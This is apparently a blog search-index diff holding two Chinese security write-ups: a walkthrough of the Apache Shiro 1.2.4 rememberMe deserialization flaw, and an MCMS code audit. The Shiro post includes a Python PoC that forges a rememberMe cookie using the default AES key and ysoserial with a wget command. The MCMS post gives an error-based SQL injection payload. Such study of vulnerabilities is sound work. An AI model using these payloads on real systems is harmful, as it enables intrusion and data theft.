@@ -6048,5 +6048,234 @@
 <p>运行结果</p>
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1j0yjbkkj313e0ewabu.jpg" alt="image-20220104122703659"></p>
 ]]></content>
+      <categories>
+        <category>代码审计</category>
+      </categories>
+      <tags>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java反序列化-shiro反序列化漏洞(四)</title>
+    <url>/2022/01/22/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9B%9B/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="0X01-shiro-550反序列漏洞"><a href="#0X01-shiro-550反序列漏洞" class="headerlink" title="0X01 shiro-550反序列漏洞"></a>0X01 shiro-550反序列漏洞</h1><p>最近审计到一套CMS，发现存在shiro反序列化漏洞，但之前跟着复现分析过，审计的时候比较吃力。所以有了本篇文章，迟早要学，不如就现在。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载地址：<a href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</a></p>
+<p>注意：主目录是shiro-root-1.2.4/samples/web</p>
+<p>修改 shiro-root-1.2.4/samples/web 目录下的 pox.xml，添加如下内容</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;!--  需要设置编译的版本 --&gt;</span><br><span class="line">     &lt;properties&gt;</span><br><span class="line">        &lt;maven.compiler.source&gt;1.6&lt;/maven.compiler.source&gt;</span><br><span class="line">        &lt;maven.compiler.target&gt;1.6&lt;/maven.compiler.target&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line">...</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;jstl&lt;/artifactId&gt;</span><br><span class="line">            &lt;!--  这里需要将jstl设置为1.2 --&gt;</span><br><span class="line">            &lt;version&gt;1.2&lt;/version&gt; </span><br><span class="line">            &lt;scope&gt;runtime&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">.....</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">&lt;dependencies&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>重新编译后，配置 Tomcat </p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyq7996v2wj327s0nun2e.jpg" alt="image-20220122043441195"></p>
+<p>启动</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyq7agwtg9j31ii0qoq5k.jpg" alt="image-20220122043501998"></p>
+<p>环境配置成功</p>
+<p>踩坑点：</p>
+<ul>
+<li><p>toolchain 报错</p>
+<p>在maven的con目录下配置toolchain.xml</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;toolchain&gt;</span><br><span class="line">  &lt;type&gt;jdk&lt;/type&gt;</span><br><span class="line">  &lt;provides&gt;</span><br><span class="line">    &lt;version&gt;1.8&lt;/version&gt; //版本</span><br><span class="line">    &lt;vendor&gt;sun&lt;/vendor&gt;</span><br><span class="line">  &lt;/provides&gt;</span><br><span class="line">  &lt;configuration&gt;</span><br><span class="line">    &lt;jdkHome&gt;/Library/Java/JavaVirtualMachines/jdk1.8.0_201.jdk/&lt;/jdkHome&gt;//jdk目录</span><br><span class="line">  &lt;/configuration&gt;</span><br><span class="line">&lt;/toolchain&gt;</span><br></pre></td></tr></tbody></table></figure></li>
+<li><p>一定要注意 jdk 运行的版本 是否是对应的。</p>
+</li>
+</ul>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>勾选 Remember Me </p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyq7ao4vtqj31460nudhi.jpg" alt="image-20220123180544023"></p>
+<p>抓包获取 Remember 值</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyq7aopzmvj31xu0naaj3.jpg" alt="image-20220123180635611"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Ln9fYDGXXhJiXa5nqLEHLvK+cK/azlnBclTgfKih5vLK+x90blH6SDrmTNMB8RN1Ri8Vh1TEojg8rGK4Fa7KvakkQzYYHpWHznKBJ1Q71qRdqeDAKCu5HglqvLO7XDEZKimqeh7gXY8i80hBp/AQ0fwSXiPWr91P1XgCct0MN/ciit3U957ZMzcWN53AQXm9sk1i7FVPdMs2QhFgZKRMNxQsNypj/G29Vqnp7zxw3r5+49emVJJZpF/wEUEmsIUr3rrXLZMVZW/N9iLVbg36KkncAh8O6b6wuoJahHt2JBXxCTxHmVxBfxMg4MLBIp+wMVdnMj3vZ8fGt6sC/Al/Eva1mXaOhtzfTMq5V1vGMgLU1FKBrMXjDHNLUvMaagxj7SmySV7dijNtvelAN9RBX2w5TPE4A9uOcZM6FYMg/0PTpxRAoEuHSQ02hrdJpDHqYLMwY+1hGQP/A8gtdAHk756IfkXIXVodI5F8TF+NS8bqj4XClmwu5T/kmFKfylZf</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h3><p>在入口点打上断点，分析一下加密过程</p>
+<p>入口点文件 <code>/shiro-root-1.2.4/core/src/main/java/org/apache/shiro/mgt/DefaultSecurityManager.java</code></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyq79n0a15j31u50u0wlb.jpg" alt="image-20220124193135036"></p>
+<p>跟进 <code>onSuccessfulLogin</code> 方法，此方法获取 </p>
+<pre><code>- subject   单个用户的状态、安全认证、授权等
+- token     用户名、密码及其他信息
+- info      用户信息
+</code></pre>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyq7aj7jxhj31om0u0n5c.jpg" alt="image-20220124194345162"></p>
+<p><code>forgetIdentity</code> 处理了 <code>subject</code> 对象，跟进 <code>forgetIdentity</code> 方法</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyq7alfajlj32da0iun2l.jpg" alt="image-20220124200142687"></p>
+<p>此处 <code>getcookie</code> 并调用了 <code>removeFrom</code> 方法，继续跟进</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyq7ai2g4tj32iy0m2jvb.jpg" alt="image-20220124200306504"></p>
+<p>跟进 <code>addCookieHeader</code> 这里其实就是 <code>set-cookie</code>，在 <code>response</code> 头部添加 <code>set-cookie: rememberMe=deleteMe</code></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyq797zqyfj31400u0tbp.jpg" alt="image-20220124200419088"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyq7alxhevj31xt0u011n.jpg" alt="image-20220124201237728"></p>
+<p>至此 <code>forgetIdentity(subject)</code> 方法跟完了，在 <code>subject</code> 对象中获取 <code>request</code> 和 <code>response</code> 值，并设置了<code>set-cookie</code> 的值。</p>
+<p>回到 <code>onSuccessfulLogin</code> 继续向下走,  <code>isRememberMe</code> 判断我们是否勾选了 <code>rememberMe</code> </p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyq798oldjj31400u0tbp.jpg" alt="image-20220124201934856"></p>
+<p>跟进 <code>rememberIdentity</code></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyq79oijrzj32760bc77s.jpg" alt="image-20220124202911884"></p>
+<p><code>convertPrincipalsToBytes</code> 处理用户名，还调用了 <code>rememberSerializedIdentity</code> 我们先跟 <code>convertPrincipalsToBytes</code></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyq79c8meqj31ma0u0qbg.jpg" alt="image-20220124203537843"></p>
+<p><code>serialize</code> 继续跟进</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyq79dikg8j31s90u0q91.jpg" alt="image-20220124203646766"></p>
+<p>可以看见此处是对用户名进行了序列化</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyq799y7xuj31xk0du41f.jpg" alt="image-20220124203822492"></p>
+<p>跳回 <code>convertPrincipalsToBytes</code> </p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyq79lbymuj32a40kk435.jpg" alt="image-20220124205334640"></p>
+<p><code>getCipherService</code> 是 shiro 提供的 AES 加密算法</p>
+<p><code>getEncryptionCipherKey</code> 获取秘钥的 <code>key</code>，查看此方法</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyq7aho20pj31f80ki76x.jpg" alt="image-20220124210625813"></p>
+<p>由于没找到调用 key 的点，反向跟踪了一下</p>
+<p><code>src/main/java/org/apache/shiro/mgt/AbstractRememberMeManager.java</code></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyq79kji09j31vk068q3q.jpg" alt="image-20220124211904643"></p>
+<p><code>AbstractRememberMeManager</code> 构造方法中调用了</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyq7aq196ej31nm0d276z.jpg" alt="image-20220124212054036"></p>
+<p>而 <code>setCipherKey</code> 中调用了 <code>setEncryptionCipherKey</code> 方法设置 key </p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyq7apjfl2j31980cs40c.jpg" alt="image-20220124212130069"></p>
+<p>最后 <code>getEncryptionCipherKey</code> 获取到 key </p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyq7anbn8sj31lx0u0gti.jpg" alt="image-20220124212945605"></p>
+<p>返回加密后的 <code>bytes</code> 流数据</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyq79ayek7j32ag0f842l.jpg" alt="image-20220124213043708"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyq7aki2oyj31yb0u0jy8.jpg" alt="image-20220124213135115"></p>
+<p>我们跳回 <code>rememberIdentity</code> </p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyq79aimv1j320c0lygqf.jpg" alt="image-20220124204612470"></p>
+<p><code>bytes</code> 的值是被序列化后的用户名， <code>rememberSerializedIdentity</code> 处理了 <code>subject</code> 值和 <code>bytes</code>值</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyq79hwruej31ky0u0477.jpg" alt="image-20220124213303895"></p>
+<p>可以看见使用 base64 加密了数据，并进行了保存，至此，我们的加密流程算是走完了。</p>
+<h3 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h3><p>断点</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/shiro-root-1.2.4/core/src/main/java/org/apache/shiro/mgt/AbstractRememberMeManager.java</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyq7ak20gej31ik0jmdjc.jpg" alt="image-20220125100058627"></p>
+<p>getRememberedSerializedIdentity 处理登录请求，跟进</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyq79p6owvj32760bc77s.jpg" alt="image-20220125102630863"></p>
+<p>cookie 中获取 base64加密值</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyq7ajqb03j32im0l0gs0.jpg" alt="image-20220125103325194"></p>
+<p>解密 base64 </p>
+<img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyq79epjy6j32ey0t810b.jpg" alt="image-20220125104251857" style="zoom:150%;">
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyq7amj2srj32c00me789.jpg" alt="image-20220125150412007"></p>
+<p>下一步 我们跳回 getRememberedPrincipals， 跟进 convertBytesToPrincipals方法</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyq7annq1yj324e0agq56.jpg" alt="image-20220125151532045"></p>
+<p>这里的 decrypt 是解密，这里和加密一样，都是获取AES加密算法及秘钥。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyq7air36dj320s0u07et.jpg" alt="image-20220125151719124"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyq7ap6rmfj31eg0u0gqw.jpg" alt="image-20220125152109776"></p>
+<p>serialized 返回的序列化的字符串 bytes 值<img src="https://tva1.sinaimg.cn/large/008i3skNly1gyq7ampsftj32au0ditcj.jpg" alt="image-20220125152406292"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBzcgAXamF2YS51dGlsLkxpbmtlZEhhc2hNYXA0wE5cEGzA+wIAAVoAC2FjY2Vzc09yZGVyeHIAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAADHcIAAAAEAAAAAF0AAhpbmlSZWFsbXNyABdqYXZhLnV0aWwuTGlua2VkSGFzaFNldNhs11qV3SoeAgAAeHIAEWphdmEudXRpbC5IYXNoU2V0ukSFlZa4tzQDAAB4cHcMAAAAED9AAAAAAAABdAAEcm9vdHh4AHcBAXEAfgAFeA==</span><br></pre></td></tr></tbody></table></figure>
+
+<p>解密后 </p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyq79j0lhej30u90jqtf1.jpg" alt="image-20220125153042314"></p>
+<p>下一步 跳回到 convertBytesToPrincipals 执行反序列化操作  </p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyq799kq47j31400u0tbp.jpg" alt="image-20220125153304103"></p>
+<p>跟进 deserialize ，可以看见 调用了readObject 执行了反序列化操作 得到用户名 </p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyq79pivzqj31w00u0jy4.jpg" alt="image-20220125153356220"></p>
+<p>这里的 readObject 并不是原生的 ObjectInputStream 而是重写的 ObjectInputStream，最后调用过程从<br>cookie 中获取 Remember 值 ——&gt; base64 解密 ——&gt; AES 解密 ——&gt; 反序列化</p>
+<p>中间有一些关于java的加密解密的算法 IV 等 由于没学过，不太了解，但是构造 POC 需要关于这一块的知识</p>
+<p>[java安全之安全加密算法][<a href="https://www.cnblogs.com/nice0e3/p/13894507.html]">https://www.cnblogs.com/nice0e3/p/13894507.html]</a></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>poc: 这个poc 没成功….</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># －*-* coding:utf-8</span></span><br><span class="line"><span class="comment"># @Time    :  2020/10/16 17:36</span></span><br><span class="line"><span class="comment"># @Author  : nice0e3</span></span><br><span class="line"><span class="comment"># @FileName: poc.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    ：https://www.cnblogs.com/nice0e3/</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rememberme</span>(<span class="params">command</span>):</span></span><br><span class="line">    <span class="comment"># popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'URLDNS', command], stdout=subprocess.PIPE)</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, <span class="string">'ysoserial.jar'</span>, <span class="string">'URLDNS'</span>, command],</span><br><span class="line">                             stdout=subprocess.PIPE)</span><br><span class="line">    <span class="comment"># popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)</span></span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># payload = encode_rememberme('127.0.0.1:12345')</span></span><br><span class="line">    <span class="comment"># payload = rememberme('calc.exe')</span></span><br><span class="line">    payload = rememberme(<span class="string">'wget http://localhost:8083'</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"./payload.cookie"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> fpw:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"rememberMe={}"</span>.<span class="built_in">format</span>(payload.decode()))</span><br><span class="line">        res = <span class="string">"rememberMe={}"</span>.<span class="built_in">format</span>(payload.decode())</span><br><span class="line">        fpw.write(res)fa</span><br></pre></td></tr></tbody></table></figure>
+
+<p>本地监听:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8083</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyq79qojsvj30cn01y3yh.jpg" alt="image-20220125193025242"></p>
+<p>使用工具打了一波，显示成功了，但是手工生成的时候链子有点问题，后续得详细分析下一下 shiro 的各种CC链</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyq79jtnl7j317f0h4aes.jpg" alt="image-20220125203923125"></p>
+]]></content>
+      <categories>
+        <category>代码审计</category>
+      </categories>
+      <tags>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MCMS代码审计</title>
+    <url>/2022/01/15/MCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="0X01-环境搭建"><a href="#0X01-环境搭建" class="headerlink" title="0X01 环境搭建"></a>0X01 环境搭建</h1><p>项目地址下载：<a href="https://gitee.com/mingSoft/MCMS">https://gitee.com/mingSoft/MCMS</a></p>
+<p>当前版本：5.2.5  也可下载的releases版本 5.2.4</p>
+<p><img src="image-20220115193615578.png" alt="image-20220115193615578"></p>
+<p>PS：注意Mysql版本需大于5.6以上</p>
+<p>创建一个mcms数据库，并且导入doc/数据库文件</p>
+<p>在<code>application-dev</code>中修改数据库账户密码</p>
+<p>运行<code>MSApplication.java main</code>方法，如下图，环境无问题</p>
+<p>管理员：msopen/密码：msopen</p>
+<p><img src="image-20220115195620671.png" alt="image-20220115195620671"></p>
+<h2 id="外置环境配置"><a href="#外置环境配置" class="headerlink" title="外置环境配置"></a>外置环境配置</h2><p>搭建Tomcat环境</p>
+<blockquote>
+<p>注意：环境最好使用1.8版本，作者使用15版本，打包war时一直报错，版本不对，最后将1.8设置默认版本后才成功。</p>
+</blockquote>
+<p>使用maven打包，点击如下图标，设置</p>
+<p><img src="image-20220118215206232.png" alt="image-20220118215206232"></p>
+<p><img src="image-20220118215232442.png" alt="image-20220118215232442"></p>
+<p>新建 tomcat server ，导入即可</p>
+<p><img src="image-20220118215629972.png" alt="image-20220118215629972"></p>
+<p>搭建成功，如果登录后提示分页插件出错</p>
+<p>原因：参考其他大佬的</p>
+<p>MSServletInitializer.java 文件从项目中删除即可,因为该类也继承了SpringBootServletInitializer类，所以导致PageHelper插件被配置了两次</p>
+<p>参考链接：<a href="https://www.zhihu.com/question/330677156">https://www.zhihu.com/question/330677156</a></p>
+<h2 id="项目目录"><a href="#项目目录" class="headerlink" title="项目目录"></a>项目目录</h2><p><img src="image-20220118220646126.png" alt="image-20220118220646126"></p>
+<p>其中我们主要关注红框的三个目录</p>
+<ul>
+<li>Action  控制器层</li>
+<li>biz     业务逻辑层</li>
+<li>dao     数据库交互层</li>
+</ul>
+<p>并且在cms中并未发现全局过滤文件。</p>
+<p>作者后端技术框架</p>
+<p><img src="image-20220118222701099.png" alt="image-20220118222701099"></p>
+<h1 id="0X02-SQL注入漏洞"><a href="#0X02-SQL注入漏洞" class="headerlink" title="0X02 SQL注入漏洞"></a>0X02 SQL注入漏洞</h1><h2 id="MyBatis-SQL-注入前置知识"><a href="#MyBatis-SQL-注入前置知识" class="headerlink" title="MyBatis SQL 注入前置知识"></a>MyBatis SQL 注入前置知识</h2><p>根据作者发布的配置文档可知， 后端使用的是 ORM框架 MyBatis </p>
+<p>MyBatis 的 SQL 语句可以使用注解方法写在类方法上，也可以使用 xml 的方式，而使用的最多的方式就是将语句写入 xml 文件中。</p>
+<p>编写 xml 文件时，MyBatis  支持两种参数符号</p>
+<ul>
+<li><code>$</code>  – 拼接 SQL<ul>
+<li><code>#</code>  – 使用预编译</li>
+</ul>
+</li>
+</ul>
+<p>当语句使用 <code>$</code> 拼接时，则会产生 SQL 注入漏洞。</p>
+<p>参考链接：<a href="https://www.freebuf.com/vuls/240578.html">https://www.freebuf.com/vuls/240578.html</a></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们关注 dao 目录，可以发现作者使用的是 xml 文件方式写入的</p>
+<p>右键点击 Find in Path 选中 File mask 在 dao 目录下搜索 xml 文件</p>
+<p><code>$</code> 搜索，发现有两条 select 语句均使用了 <code>$</code> 拼接参数 categoryId，跟进</p>
+<p><img src="image-20220118223834663.png" alt="image-20220118223834663"></p>
+<p>漏洞点：src/main/java/net/mingsoft/cms/dao/IContentDao.xml</p>
+<p>可以发现 这条 select 语句是属于 select 标签 id 是 query，说明是 query 方法调用</p>
+<p><img src="image-20220118224150971.png" alt="image-20220118224150971"></p>
+<p>IContentDao.xml 对应的映射接口类是 net.mingsoft.cms.dao.c，此文件中并未找到 query 方法，此时我们继续跟进到父类 IBaseDao（net.mingsoft.base.dao.IBaseDao）</p>
+<p><img src="image-20220118224431593.png" alt="image-20220118224431593"></p>
+<p>在父类 IBaseDao 中找到 query 方法，IContentDao 接口类 继承父类 IBaseDao，所以可调用 query 方法</p>
+<p><img src="image-20220118224807165.png" alt="image-20220118224807165"></p>
+<p>此时，我们需要去寻找 query 方法的对应的实现类。</p>
+<p>IContentDao 对应的业务接口是 net.mingsoft.cms.biz.IContentBiz，而实现类是net.mingsoft.cms.biz.impl.ContentBizImpl，同理，跟进 ContentBizImpl 的 父类 BaseBizImpl（net.mingsoft.base.biz.impl.BaseBizImpl）发现父类中实现了 query 方法，调用了 dao 层的 query 方法</p>
+<p><img src="image-20220118225654859.png" alt="image-20220118225654859"></p>
+<p>现在我们只需要跟进控制器层代码，寻找 categoryId 可控点，即可完成整个调用链。</p>
+<p>对应的控制器文件 src/main/java/net/mingsoft/cms/action/ContentAction.java 104行处</p>
+<p><img src="image-20220118230301298.png" alt="image-20220118230301298"> </p>
+<p><code>@ApiImplicitParam </code> 注解中定义了 categoryId 参数对应的是所属栏目，使用的方法是 query</p>
+<p>而 127行 对应的调用处是 list 并且使用 post 方法获取到上述所有需要查询的参数并放到 content 中，通过 query 方法去查询对应的数据</p>
+<p><img src="image-20220118230705712.png" alt="image-20220118230705712"></p>
+<p>此时我们可以去登录，验证漏洞是否存在</p>
+<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>功能大全-&gt;文章管理 抓包</p>
+<p><img src="image-20220118232135765.png" alt="image-20220118232135765"></p>
+<p>在 pageSize 后面添加 categoryId 参数</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Payload: categoryId=1' and updatexml(1,concat(0x7e,databases(),0x7e),1) and '1</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="image-20220118232024944.png" alt="image-20220118232024944"></p>
+<p><img src="image-20220118231714788.png" alt="image-20220118231714788"></p>
+<p>成功，同时可以使用 Mysql 数据库监控程序，查看和数据库交互的语句</p>
+<p><img src="image-20220118232519574.png" alt="image-20220118232519574"></p>
+<p>注入的语句</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">select count(0) from ( select ct.* from ( select ct.*,cc.category_path from cms_content ct join cms_category cc on ct.category_id=cc.id WHERE ct.del=0 and (ct.category_id='1'' and updatexml(1,concat(0x7e,user(),0x7e),1) and ''1' or ct.category_id in (select id FROM cms_category where find_in_set('1' and updatexml(1,concat(0x7e,user(),0x7e),1) and '1',CATEGORY_PARENT_IDS)&gt;0)) )ct ORDER BY ct.content_datetime desc,content_sort desc ) tmp_count</span><br></pre></td></tr></tbody></table></figure>
+
+<p>抓包时，还发现了华点。。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">rememberMe=rWugSNNLZQzRFHaq7ak+mgedIxoeZBy4qAquhNineUSo8u1NL/L4YCkX4vhDD9i1d/Hm2oBNc4ou74W/ALQNI5GYQH/tGQcYkffbwtjd4VZuoXD4D73yWZ3IGNIbVxXLJgk5WCc0VkOIizpA529fHxCurk4RLpC5K6EeX+J/TK8uGYnNtZyDz50BnbtF0UgntjTpRx++tnbB1XEpiUm4T/+AR1jH3U3RI/BCRXpAwg08lsFEBTYloTj+CqAHKMFCXOBIAdS4F/2pnHJfba7KU2JKNap0xu8maiRCs3+qYPncV3dpwzA8KyVOvnUIaNxOBSMEclpiQi1ykpwd32e4eqcC4Zey9lTJIp+znimCIszR5Qrn3SGewegH7BOrzdSkyHpDJxPWwejq9UYJ6ZkthidmrM8YVRHD8+kJGpkt/po42qP4JmGW6JP4Wt4StgsJZEO+bS/HjFwOpbDkJ3nnqZGaZzoAUmI+TaF8yPE9fmHNg01HtbiJsR8Ml6YcDXJdTOZ0xzPaGnUanggXwlL2x3DEndd0DKHfMHe8NNEe0KTMPoI+/ScWkF+Ogjomuo2mRqVMVWdYMsimMB73MFfW+9U/ugVVREqzSuH7Ym1KdwvtsCrQBMjLBz7P6d10Uvi2zL8g86u8wKhKoBg5gu8jmO8tQJkdb53VMpYNpyc8SnujThz/CQgyRjPRJ6v9lINR7rRQ0SjTU2wHIJfToaIOerDgxj2wTcw2tcLJKj8fj0DamOAdXrNhayx1xHYS16bU9PO3TteshfPCPOBrC31SKKY1RxTMBcMFrDTApI0n9eSOhDttMHp879iibCXXgH17TfrXIsymd+5iSCpkKJCruhwZJyi8TtvShgotzE0OumKObevO2p1/D2lWX1yuZ2zL2wSMtKReGo5g8ONab5bOQsp+B++LjFhLUsBLqWiBT1L8wNwJl5yTy1jgdpC2tmkz0judbdp/h9E6J9pDEhUsUllYeVyzadnCYugRDMrNbcDFusdUKOUZrz8yBLTuHcPopP1hmDJnotSnvKuAdg36mUzuipolOMGHz49OkAzQE9y8aV1S33hBMs8dCF+1bL+VZYKlpPriP5LWrEiKzf3v/L9sojsDrLzbhZjbBaZ2zkUdh9O/dyWyw4hBSNVUYmO3pjTjIWBbhiBFKjc12S6jcTP/QPkY1i9deoMhMhHuP0gYlNiL4YLpsnXnAwaElaTutHWPbQcHQhXQounbYJRIVGiXCj3aLNQ4wgOlZdLMAvcAoyRljrIrjQJcfInuQNCKMYf5d9ZbtCfB3NJyZ3H3ff56pS+ipZfJ6RMIijqMFHs448CGn0lqJjpFD/bH+CTQIEvwF7tHJw==</span><br></pre></td></tr></tbody></table></figure>
+
+<p>网站还使用 shiro 框架，后续可以跟踪一下此漏洞。</p>
+<h1 id="0X03-shiro反序列化"><a href="#0X03-shiro反序列化" class="headerlink" title="0X03 shiro反序列化"></a>0X03 shiro反序列化</h1><p>shiro配置文件：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">repository/net/mingsoft/ms-basic/2.1.10/ms-basic2.1.10.jar!/net/mingsoft/config/ShiroConfig.class</span><br></pre></td></tr></tbody></table></figure>
+
+<p>mcms作者将核心一些配置文件封装成 <code>ms-basic2.1.10.jar</code> </p>
+<p><img src="image-20220121223946513.png" alt="image-20220121223946513"></p>
+<p>ShiroConfig.class </p>
